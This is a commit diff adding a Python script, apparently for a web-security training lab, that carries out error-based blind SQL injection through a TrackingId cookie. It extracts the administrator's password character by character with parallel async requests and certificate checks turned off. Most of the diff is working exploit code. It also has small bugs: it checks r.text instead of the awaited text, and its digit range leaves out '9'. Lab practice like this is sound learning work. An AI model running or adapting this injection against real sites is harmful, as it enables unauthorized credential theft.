12de4322d1b2315a8e4173c94d64dd040199c1b6
Fabien Sonpar <SonpaFAb@bvb.edu-it.local>
2026-05-22 08:58:18 +0200

    python lab 12 script

--- sqli-lab-12.py
+++ sqli-lab-12.py
@@ -7,15 +7,68 @@ import aiohttp
 import json
 import copy
 
-def getChar(position, url, session, cookies_in):
-    # Crack characters 0-9
+password_extracted = {}
+
+"""
+Get the character for a single position.
+Character is saved in the global variable "password_extracted".
+"""
+async def getChar(position, url, session, cookies_in):
+    # Crack characters 0-9 based on ascii values
+    # table (see https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/ASCII-Table-wide.svg/960px-ASCII-Table-wide.svg.png)
     for j in range(48, 57):
         cookies = copy.deepcopy(cookies_in)
         sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
         cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload
         async with session.get(url, cookies=cookies, ssl=False) as r:
-            
+            text = await r.text()
+            if "Internal Server Error" in r.text:
+                print("char %s at pos %s\n" % (chr(j), position))
+                password_extracted[position] = chr(j)
+                return
 
+    # Crack characters a-z based on ascii values
+    # table
+    for j in range(97, 123):
+        cookies = copy.deepcopy(cookies_in)
+        sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
+        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload
+        async with session.get(url, cookies=cookies, ssl=False) as r:
+            text = await r.text()
+            if "Internal Server Error" in r.text:
+                print("char %s at pos %s\n" % (chr(j), position))
+                password_extracted[position] = chr(j)
+                return
+
+"""
+Run the tasks to get the individual characters in parallel.
+Using aiohttp as asynchronous http client.
+"""
+async def runParallel(url, cookies):
+    async with aiohttp.ClientSession() as session:
+        rangeNums = list(range(1, 21))
+        tasks = [getChar(i, url, session, cookies) for i in rangeNums]
+        await asyncio.gather(*tasks)
+    
+    password = "".join(
+        password_extracted[i] for i in sorted(password_extracted)
+    )
+    print("\npassword: %s\n" % password)
+
+
+"""
+Load config settings from config.json
+and run parallel character crack.
+
+Config layout:
+{
+    "TrackingId": "<tracking_id>",
+    "session": "<session>",
+    "url": "<url>",
+    "http_proxy": "<http_proxy>",
+    "https_proxy": "<https_proxy>"
+}
+"""
 def main():
     with open("config.json") as f:
         config = json.load(f)
